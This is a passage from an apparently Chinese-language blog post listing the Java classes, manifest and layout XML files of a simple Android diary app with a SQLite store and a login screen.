class="hljs-keyword">if</span>(cursor.moveToFirst())&#123;<br>            <span class="hljs-keyword">do</span>&#123;<br>                String time=cursor.getString(cursor.getColumnIndex(<span class="hljs-string">&quot;time&quot;</span>));<br>                String title=cursor.getString(cursor.getColumnIndex(<span class="hljs-string">&quot;title&quot;</span>));<br>                tmp=<span class="hljs-keyword">new</span> DiaryList(time,title);<br>                diaryLists.add(tmp);<br>            &#125;<span class="hljs-keyword">while</span> (cursor.moveToNext());<br>        &#125;<br>        cursor.close();<br>    &#125;<br>&#125;<br></code></pre></div></td></tr></table></figure><h1 id="其他类"><a href="#其他类" class="headerlink" title="其他类"></a>其他类</h1><p>Database.java</p><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">import</span> android.content.Context;<br><span class="hljs-keyword">import</span> android.database.sqlite.SQLiteDatabase;<br><span class="hljs-keyword">import</span> android.database.sqlite.SQLiteOpenHelper;<br><span class="hljs-keyword">import</span> android.widget.Toast;<br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Database</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">SQLiteOpenHelper</span> </span>&#123;<br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * 数据库创建sql语句</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> String create_diary=<span class="hljs-string">&quot;create table diary(&quot;</span><br>            +<span class="hljs-string">&quot;time varchar(100),&quot;</span><br>            +<span class="hljs-string">&quot;title varchar(500),&quot;</span><br>            +<span class="hljs-string">&quot;content text,&quot;</span><br>            +<span class="hljs-string">&quot;primary key(time,title));&quot;</span>;<br><br>    <span class="hljs-keyword">private</span> Context mContext;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-title">Database</span><span class="hljs-params">(Context context,String name,SQLiteDatabase.CursorFactory factory,<span class="hljs-keyword">int</span> version)</span></span>&#123;<br>        <span class="hljs-keyword">super</span>(context,name,factory,version);<br>        mContext=context;<br>    &#125;<br><br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * 应用创建是就创建数据库</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@param</span> db</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">onCreate</span><span class="hljs-params">(SQLiteDatabase db)</span> </span>&#123;<br>        db.execSQL(create_diary);<br>        Toast.makeText(mContext,<span class="hljs-string">&quot;Create succeeded&quot;</span>,Toast.LENGTH_SHORT).show();<br>    &#125;<br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * 需要更新时使用的部分</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@param</span> db</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">onUpgrade</span><span class="hljs-params">(SQLiteDatabase db, <span class="hljs-keyword">int</span> oldVersion, <span class="hljs-keyword">int</span> newVersion)</span> </span>&#123;<br><br>    &#125;<br>&#125;<br><br></code></pre></div></td></tr></table></figure><p>DiaryList.java</p><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">DiaryList</span> </span>&#123;<br>    <span class="hljs-keyword">private</span> String time;<br>    <span class="hljs-keyword">private</span> String title;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> String <span class="hljs-title">getTime</span><span class="hljs-params">()</span> </span>&#123;<br>        <span class="hljs-keyword">return</span> time;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">setTime</span><span class="hljs-params">(String time)</span> </span>&#123;<br>        <span class="hljs-keyword">this</span>.time = time;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> String <span class="hljs-title">getTitle</span><span class="hljs-params">()</span> </span>&#123;<br>        <span class="hljs-keyword">return</span> title;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">setTitle</span><span class="hljs-params">(String title)</span> </span>&#123;<br>        <span class="hljs-keyword">this</span>.title = title;<br>    &#125;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-title">DiaryList</span><span class="hljs-params">(String time,String title)</span></span>&#123;<br>        <span class="hljs-keyword">this</span>.title=title;<br>        <span class="hljs-keyword">this</span>.time=time;<br>    &#125;<br>&#125;<br><br></code></pre></div></td></tr></table></figure><p>Img.java</p><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.lwx.blog.Bean;<br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Img</span> </span>&#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">int</span> img=<span class="hljs-number">12</span>;<br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">int</span> <span class="hljs-title">getImg</span><span class="hljs-params">()</span> </span>&#123;<br>        <span class="hljs-keyword">return</span> img;<br>    &#125;<br>&#125;<br><br></code></pre></div></td></tr></table></figure><h1 id="AndroidManifest-xml"><a href="#AndroidManifest-xml" class="headerlink" title="AndroidManifest.xml"></a>AndroidManifest.xml</h1><figure class="highlight xml"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">manifest</span> <span class="hljs-attr">xmlns:android</span>=<span class="hljs-string">&quot;http://schemas.android.com/apk/res/android&quot;</span></span><br><span class="hljs-tag">    <span class="hljs-attr">package</span>=<span class="hljs-string">&quot;com.lwx.blog&quot;</span>&gt;</span><br><br>    <span class="hljs-tag">&lt;<span class="hljs-name">application</span></span><br><span class="hljs-tag">        &lt;!<span class="hljs-attr">--</span>增加允许的内存<span class="hljs-attr">--</span>&gt;</span><br>        android:largeHeap=&quot;true&quot;<br>        android:allowBackup=&quot;true&quot;<br>        android:hardwareAccelerated=&quot;false&quot;<br>        android:icon=&quot;@drawable/logo&quot;<br>        android:label=&quot;日记本&quot;<br>        android:roundIcon=&quot;@mipmap/ic_launcher_round&quot;<br>        android:supportsRtl=&quot;true&quot;<br>        android:theme=&quot;@style/Theme.Blog&quot;&gt;<br>        <span class="hljs-tag">&lt;<span class="hljs-name">activity</span> <span class="hljs-attr">android:name</span>=<span class="hljs-string">&quot;.ContentActivity&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">activity</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">activity</span> <span class="hljs-attr">android:name</span>=<span class="hljs-string">&quot;.DiaryListActivity&quot;</span> /&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">activity</span> <span class="hljs-attr">android:name</span>=<span class="hljs-string">&quot;.MainActivity&quot;</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">intent-filter</span>&gt;</span><br>                <span class="hljs-tag">&lt;<span class="hljs-name">action</span> <span class="hljs-attr">android:name</span>=<span class="hljs-string">&quot;android.intent.action.MAIN&quot;</span> /&gt;</span><br><br>                <span class="hljs-tag">&lt;<span class="hljs-name">category</span> <span class="hljs-attr">android:name</span>=<span class="hljs-string">&quot;android.intent.category.LAUNCHER&quot;</span> /&gt;</span><br>            <span class="hljs-tag">&lt;/<span class="hljs-name">intent-filter</span>&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">activity</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">application</span>&gt;</span><br><br><span class="hljs-tag">&lt;/<span class="hljs-name">manifest</span>&gt;</span><br></code></pre></div></td></tr></table></figure><h1 id="layout"><a href="#layout" class="headerlink" title="layout"></a>layout</h1><p>activity_content.xml</p><figure class="highlight xml"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">manifest</span> <span class="hljs-attr">xmlns:android</span>=<span class="hljs-string">&quot;http://schemas.android.com/apk/res/android&quot;</span></span><br><span class="hljs-tag">    <span class="hljs-attr">package</span>=<span class="hljs-string">&quot;*****&quot;</span>&gt;</span><br><br>    <span class="hljs-tag">&lt;<span class="hljs-name">application</span></span><br><span class="hljs-tag">        <span class="hljs-attr">android:largeHeap</span>=<span class="hljs-string">&quot;true&quot;</span></span><br><span class="hljs-tag">        <span class="hljs-attr">android:hardwareAccelerated</span>=<span class="hljs-string">&quot;false&quot;</span></span><br><span class="hljs-tag">        <span class="hljs-attr">android:allowBackup</span>=<span class="hljs-string">&quot;true&quot;</span></span><br><span class="hljs-tag">        <span class="hljs-attr">android:icon</span>=<span class="hljs-string">&quot;@drawable/logo&quot;</span></span><br><span class="hljs-tag">        <span class="hljs-attr">android:label</span>=<span class="hljs-string">&quot;Nikki&quot;</span></span><br><span class="hljs-tag">        <span class="hljs-attr">android:roundIcon</span>=<span class="hljs-string">&quot;@mipmap/ic_launcher_round&quot;</span></span><br><span class="hljs-tag">        <span class="hljs-attr">android:supportsRtl</span>=<span class="hljs-string">&quot;true&quot;</span></span><br><span class="hljs-tag">        <span class="hljs-attr">android:theme</span>=<span class="hljs-string">&quot;@style/Theme.Blog&quot;</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">activity</span> <span class="hljs-attr">android:name</span>=<span class="hljs-string">&quot;.ContentActivity&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">activity</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">activity</span> <span class="hljs-attr">android:name</span>=<span class="hljs-string">&quot;.DiaryListActivity&quot;</span> /&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">activity</span> <span class="hljs-attr">android:name</span>=<span class="hljs-string">&quot;.MainActivity&quot;</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">intent-filter</span>&gt;</span><br>                <span class="hljs-tag">&lt;<span class="hljs-name">action</span> <span class="hljs-attr">android:name</span>=<span class="hljs-string">&quot;android.intent.action.MAIN&quot;</span> /&gt;</span><br><br>                <span class="hljs-tag">&lt;<span class="hljs-name">category</span> <span class="hljs-attr">android:name</span>=<span class="hljs-string">&quot;android.intent.category.LAUNCHER&quot;</span> /&gt;</span><br>            <span class="hljs-tag">&lt;/<span class="hljs-name">intent-filter</span>&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">activity</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">application</span>&gt;</span><br><br><span class="hljs-tag">&lt;/<span class="hljs-name">manifest</span>&gt;</span><br></code></pre></div></td></tr></table></figure><p>activity_diary_list.xml</p><figure class="highlight xml"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">RelativeLayout</span> <span class="hljs-attr">xmlns:android</span>=<span class="hljs-string">&quot;http://schemas.android.com/apk/res/android&quot;</span></span><br><span class="hljs-tag">    <span class="hljs-attr">xmlns:tools</span>=<span class="hljs-string">&quot;http://schemas.android.com/tools&quot;</span></span><br><span class="hljs-tag">    <span class="hljs-attr">android:layout_width</span>=<span class="hljs-string">&quot;match_parent&quot;</span></span><br><span class="hljs-tag">    <span class="hljs-attr">android:layout_height</span>=<span class="hljs-string">&quot;match_parent&quot;</span></span><br><span class="hljs-tag">    <span class="hljs-attr">android:id</span>=<span class="hljs-string">&quot;@+id/diary&quot;</span></span><br><span class="hljs-tag">    <span class="hljs-attr">tools:context</span>=<span class="hljs-string">&quot;.DiaryListActivity&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">androidx.viewpager2.widget.ViewPager2</span></span><br><span class="hljs-tag">        <span class="hljs-attr">android:id</span>=<span class="hljs-string">&quot;@+id/diarypagers&quot;</span></span><br><span class="hljs-tag">        <span class="hljs-attr">android:layout_width</span>=<span class="hljs-string">&quot;match_parent&quot;</span></span><br><span class="hljs-tag">        <span class="hljs-attr">android:layout_height</span>=<span class="hljs-string">&quot;match_parent&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">androidx.viewpager2.widget.ViewPager2</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">RelativeLayout</span>&gt;</span><br></code></pre></div></td></tr></table></figure><p>activity_main.xml</p><figure class="highlight xml"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">androidx.constraintlayout.widget.ConstraintLayout</span> <span class="hljs-attr">xmlns:android</span>=<span class="hljs-string">&quot;http://schemas.android.com/apk/res/android&quot;</span></span><br><span class="hljs-tag">    <span class="hljs-attr">xmlns:app</span>=<span class="hljs-string">&quot;http://schemas.android.com/apk/res-auto&quot;</span></span><br><span class="hljs-tag">    <span class="hljs-attr">xmlns:tools</span>=<span class="hljs-string">&quot;http://schemas.android.com/tools&quot;</span></span><br><span class="hljs-tag">    <span class="hljs-attr">android:layout_width</span>=<span class="hljs-string">&quot;match_parent&quot;</span></span><br><span class="hljs-tag">    <span class="hljs-attr">android:layout_height</span>=<span class="hljs-string">&quot;match_parent&quot;</span></span><br><span class="hljs-tag">    <span class="hljs-attr">android:background</span>=<span class="hljs-string">&quot;@drawable/back&quot;</span></span><br><span class="hljs-tag">    <span class="hljs-attr">tools:context</span>=<span class="hljs-string">&quot;.MainActivity&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">EditText</span></span><br><span class="hljs-tag">        <span class="hljs-attr">android:id</span>=<span class="hljs-string">&quot;@+id/accountEdit&quot;</span></span><br><span class="hljs-tag">        <span class="hljs-attr">android:layout_width</span>=<span class="hljs-string">&quot;250dp&quot;</span></span><br><span class="hljs-tag">        <span class="hljs-attr">android:layout_height</span>=<span class="hljs-string">&quot;wrap_content&quot;</span></span><br><span class="hljs-tag">        <span class="hljs-attr">android:singleLine</span>=<span class="hljs-string">&quot;true&quot;</span></span><br><span class="hljs-tag">        <span class="hljs-attr">android:textColor</span>=<span class="hljs-string">&quot;#FFFF&quot;</span></span><br><span class="hljs-tag">        <span class="hljs-attr">android:hint</span>=<span class="hljs-string">&quot;请输入用户名&quot;</span></span><br><span class="hljs-tag">        <span class="hljs-attr">app:layout_constraintBottom_toBottomOf</span>=<span class="hljs-string">&quot;parent&quot;</span></span><br><span class="hljs-tag">        <span class="hljs-attr">app:layout_constraintEnd_toEndOf</span>=<span class="hljs-string">&quot;parent&quot;</span></span><br><span class="hljs-tag">        <span class="hljs-attr">app:layout_constraintStart_toStartOf</span>=<span class="hljs-string">&quot;parent&quot;</span></span><br><span class="hljs-tag">        <span class="hljs-attr">app:layout_constraintTop_toTopOf</span>=<span class="hljs-string">&quot;parent&quot;</span></span><br><span class="hljs-tag">        <span class="hljs-attr">app:layout_constraintVertical_bias</span>=<span class="hljs-string">&quot;0.3&quot;</span> /&gt;</span><br><br>    <span class="hljs-tag">&lt;<span class="hljs-name">CheckBox</span></span><br><span class="hljs-tag">        <span class="hljs-attr">android:id</span>=<span class="hljs-string">&quot;@+id/rememberPass&quot;</span></span><br><span class="hljs-tag">        <span class="hljs-attr">android:layout_width</span>=<span class="hljs-string">&quot;wrap_content&quot;</span></span><br><span class="hljs-tag">        <span class="hljs-attr">android:layout_height</span>=<span class="hljs-string">&quot;wrap_content&quot;</span></span><br><span class="hljs-tag">        <span class="hljs-attr">app:layout_constraintBottom_toBottomOf</span>=<span class="hljs-string">&quot;parent&quot;</span></span><br><span class="hljs-tag">        <span class="hljs-attr">app:layout_constraintEnd_toEndOf</span>=<span class="hljs-string">&quot;parent&quot;</span></span><br><span class="hljs-tag">        <span class="hljs-attr">app:layout_constraintHorizontal_bias</span>=<span class="hljs-string">&quot;0.3&quot;</span></span><br><span class="hljs-tag">        <span class="hljs-attr">app:layout_constraintStart_toStartOf</span>=<span class="hljs-string">&quot;parent&quot;</span></span><br><span class="hljs-tag">        <span class="hljs-attr">app:layout_constraintTop_toBottomOf</span>=<span class="hljs-string">&quot;@+id/pwEdit&quot;</span></span><br><span class="hljs-tag">        <span class="hljs-attr">app:layout_constraintVertical_bias</span>=<span class="hljs-string">&quot;0.13&quot;</span> /&gt;</span><br><br>    <span class="hljs-tag">&lt;<span class="hljs-name">TextView</span></span><br><span class="hljs-tag">        <span class="hljs-attr">android:layout_width</span>=<span class="hljs-string">&quot;wrap_content&quot;</span></span><br><span class="hljs-tag">        <span class="hljs-attr">android:layout_height</span>=<span class="hljs-string">&quot;wrap_content&quot;</span></span><br><span class="hljs-tag">        <span class="hljs-attr">android:text</span>=<span class="hljs-string">&quot;保存登录状态&quot;</span></span><br><span class="hljs-tag">        <span class="hljs-attr">android:textSize</span>=<span class="hljs-string">&quot;15sp&quot;</span></span><br><span class="hljs-tag">        <span class="hljs-attr">app:layout_constraintBottom_toBottomOf</span>=<span class="hljs-string">&quot;parent&quot;</span></span><br><span class="hljs-tag">        <span class="hljs-attr">app:layout_constraintEnd_toEndOf</span>=<span class="hljs-string">&quot;parent&quot;</span></span><br><span class="hljs-tag">        <span class="hljs-attr">app:layout_constraintHorizontal_bias</span>=<span class="hljs-string">&quot;0.2&quot;</span></span><br><span class="hljs-tag">        <span class="hljs-attr">app:layout_constraintStart_toEndOf</span>=<span class="hljs-string">&quot;@+id/rememberPass&quot;</span></span><br><span class="hljs-tag">        <span class="hljs-attr">app:layout_constraintTop_toBottomOf</span>=<span class="hljs-string">&quot;@+id/pwEdit&quot;</span></span><br><span class="hljs-tag">        <span class="hljs-attr">app:layout_constraintVertical_bias</span>=<span class="hljs-string">&quot;0.158&quot;</span> /&gt;</span><br><br><br>    <span class="hljs-tag">&lt;<span class="hljs-name">EditText</span></span><br><span class="hljs-tag">        <span class="hljs-attr">android:id</span>=<span class="hljs-string">&quot;@+id/pwEdit&quot;</span></span><br><span class="hljs-tag">        <span class="hljs-attr">android:layout_width</span>=<span class="hljs-string">&quot;250dp&quot;</span></span><br><span class="hljs-tag">        <span class="hljs-attr">android:layout_height</span>=<span class="hljs-string">&quot;wrap_content&quot;</span></span><br><span class="hljs-tag">        <span class="hljs-attr">android:singleLine</span>=<span class="hljs-string">&quot;true&quot;</span></span><br><span class="hljs-tag">        <span class="hljs-attr">android:textColor</span>=<span class="hljs-string">&quot;#FFFF&quot;</span></span><br><span class="hljs-tag">        <span class="hljs-attr">android:hint</span>=<span class="hljs-string">&quot;请输入密码&quot;</span></span><br><span class="hljs-tag"></span><br><span class="hljs-tag">        <span class="hljs-attr">android:inputType</span>=<span class="hljs-string">&quot;textPassword&quot;</span></span><br><span class="hljs-tag">        <span class="hljs-attr">app:layout_constraintBottom_toBottomOf</span>=<span class="hljs-string">&quot;parent&quot;</span></span><br><span class="hljs-tag">        <span class="hljs-attr">app:layout_constraintEnd_toEndOf</span>=<span class="hljs-string">&quot;parent&quot;</span></span><br><span class="hljs-tag">        <span class="hljs-attr">app:layout_constraintHorizontal_bias</span>=<span class="hljs-string">&quot;0.5&quot;</span></span><br><span class="hljs-tag">        <span class="hljs-attr">app:layout_constraintStart_toStartOf</span>=<span class="hljs-string">&quot;parent&quot;</span></span><br><span class="hljs-tag">        <span class="hljs-attr">app:layout_constraintTop_toTopOf</span>=<span class="hljs-string">&quot;parent&quot;</span></span><br><span class="hljs-tag">        <span class="hljs-attr">app:layout_constraintVertical_bias</span>=<span class="hljs-string">&quot;0.44&quot;</span> /&gt;</span><br><br>    <span class="hljs-tag">&lt;<span class="hljs-name">Button</span></span><br><span class="hljs-tag">        <span class="hljs-attr">android:id</span>=<span class="hljs-string">&quot;@+id/login&quot;</span></span><br><span class="hljs-tag">        <span class="hljs-attr">android:layout_width</span>=<span class="hljs-string">&quot;wrap_content&quot;</span></span><br><span class="hljs-tag">        <span class="hljs-attr">android:layout_height</span>=<span class="hljs-string">&quot;wrap_content&quot;</span></span><br><span class="hljs-tag">        <span class="hljs-attr">android:background</span>=<span class="hljs-string">&quot;#00000000&quot;</span></span><br><span class="hljs-tag">        <span class="hljs-attr">android:text</span>=<span class="hljs-string">&quot;LOG&quot;</span></span><br><span class="hljs-tag">        <span class="hljs-attr">app:layout_constraintBottom_toBottomOf</span>=<span class="hljs-string">&quot;parent&quot;</span></span><br><span class="hljs-tag">        <span class="hljs-attr">app:layout_constraintHorizontal_bias</span>=<span class="hljs-string">&quot;0.498&quot;</span></span><br><span class="hljs-tag">        <span class="hljs-attr">app:layout_constraintLeft_toLeftOf</span>=<span class="hljs-string">&quot;parent&quot;</span></span><br><span class="hljs-tag">        <span class="hljs-attr">app:layout_constraintRight_toRightOf</span>=<span class="hljs-string">&quot;parent&quot;</span></span><br><span class="hljs-tag">        <span class="hljs-attr">app:layout_constraintTop_toTopOf</span>=<span class="hljs-string">&quot;parent&quot;</span></span><br><span class="hljs-tag">        <span class="hljs-attr">app:layout_constraintVertical_bias</span>=<span class="hljs-string">&quot;0.655&quot;</span> /&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">androidx.constraintlayout.widget.ConstraintLayout</span>&gt;</span><br></code></pre></div></td></tr></table></figure><p>diary_list.xml</p><figure class="highlight xml"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">androidx.constraintlayout.widget.ConstraintLayout</span></span><br><span class="hljs-tag">    <span class="hljs-attr">xmlns:android</span>=<span class="hljs-string">&quot;http://schemas.android.com/apk/res/android&quot;</span></span><br><span class="hljs-tag">    <span class="hljs-attr">xmlns:app</span>=<span class="hljs-string">&quot;http://schemas.android.com/apk/res-auto&quot;</span></span><br><span class="hljs-tag">    <span class="hljs-attr">android:layout_width</span>=<span class="hljs-string">&quot;match_parent&quot;</span></span><br><span class="hljs-tag">    <span class="hljs-attr">android:layout_height</span>=<span class="hljs-string">&quot;match_parent&quot;</span>&gt;</span><br><br>    <span class="hljs-tag">&lt;<span class="hljs-name">TextView</span></span><br><span class="hljs-tag">        <span class="hljs-attr">android:id</span>=<span class="hljs-string">&quot;@+id/time&quot;</span></span><br><span class="hljs-tag">        <span class="hljs-attr">android:layout_width</span>=<span class="hljs-string">&quot;wrap_content&quot;</span></span><br><span class="hljs-tag">        <span class="hljs-attr">android:layout_height</span>=<span class="hljs-string">&quot;wrap_content&quot;</span></span><br><span class="hljs-tag">        <span class="hljs-attr">android:textSize</span>=<span class="hljs-string">&quot;50px&quot;</span></span><br><span class="hljs-tag">        <span class="hljs-attr">android:textColor</span>=<span class="hljs-string">&quot;#FF99ff&quot;</span></span><br><span class="hljs-tag">        <span class="hljs-attr">app:layout_constraintBottom_toBottomOf</span>=<span class="hljs-string">&quot;parent&quot;</span></span><br><span class="hljs-tag">        <span class="hljs-attr">app:layout_constraintEnd_toEndOf</span>=<span 